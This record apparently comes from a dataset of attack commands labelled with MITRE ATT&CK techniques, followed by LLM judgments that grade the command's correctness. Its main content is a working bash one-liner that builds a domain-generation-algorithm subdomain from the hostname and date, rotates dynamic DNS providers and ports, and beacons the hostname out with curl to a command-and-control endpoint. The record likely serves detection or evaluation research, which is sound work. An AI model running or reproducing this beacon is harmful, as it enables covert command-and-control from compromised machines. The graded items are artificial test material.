command: seed="$(hostname -s)$(date -u +%j)"; sub=$(echo -n "$seed" | md5sum | cut -c1-10); zones=(dynu.net ddns.net myftp.biz hopto.org); dom="$sub.${zones[$(($(date -u +%H)%${#zones[@]}))]}"; port_candidates=(443 8443 9443 12443 17443); port="${port_candidates[$(($(date -u +%M)%${#port_candidates[@]}))]}"; curl --silent --connect-timeout 5 "https://$dom:$port/api/ping?node=$(hostname -s)"
explanation: Builds a short DGA label from host and day-of-year, rotates provider domains by hour, and selects a port from a predefined set based on minute. This dynamic resolution aligns with T1568.
rationale_steps: Generate a host- and date-derived seed and hash.
Select a dynamic DNS provider based on hour.
Pick a port from a rotating candidate list by minute.
Contact the resolved domain with curl.

llm_judgments.syntactic_justification: The command is perfectly well-formed with proper variable assignments, balanced quotes, valid array syntax, correct arithmetic operations, and proper command chaining using semicolons.
llm_judgments.semantic_justification: The command perfectly implements T1568 (Dynamic Resolution) by creating a domain generation algorithm based on hostname and date, rotating through domains by hour, selecting ports by minute, and establishing a connection that would beacon to the dynamically generated endpoint.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced syntax, valid command substitutions, array manipulations, and correct flag usage for all utilities.
llm_judgments.semantic_justification: The command perfectly implements a sophisticated dynamic resolution mechanism aligned with T1568 by algorithmically generating a subdomain, rotating base domains hourly, and selecting ports minute-by-minute for a C2 beacon.

llm_judgments.syntactic_justification: Command uses valid Bash syntax with balanced quotes/expansions, proper arrays/indexing, correct command separators, and valid curl flags.
llm_judgments.semantic_justification: It algorithmically derives a subdomain from host and time, rotates provider domains and ports, and attempts an HTTPS beacon, matching Dynamic Resolution (T1568).
